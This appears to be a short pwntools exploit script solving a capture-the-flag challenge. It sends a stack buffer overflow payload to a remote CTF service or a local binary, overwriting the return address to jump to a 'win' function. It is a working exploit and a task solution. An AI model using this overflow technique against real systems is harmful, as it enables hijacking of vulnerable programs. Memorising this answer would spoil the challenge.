from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10008"
r=nc.split(" ")
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,""" b* main+35
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

# Simple buffer overflow that overwrites the return address with `win+1`.
# Note: `e.sym.win+1` is often used to skip a prologue or align to an instruction
# boundary (e.g., skip a `push rbp` / stack frame setup), depending on the binary.
payload = b"a" * 0x50 + p64(0) + p64(e.sym.win + 1)

p.sendline(payload)
p.interactive()
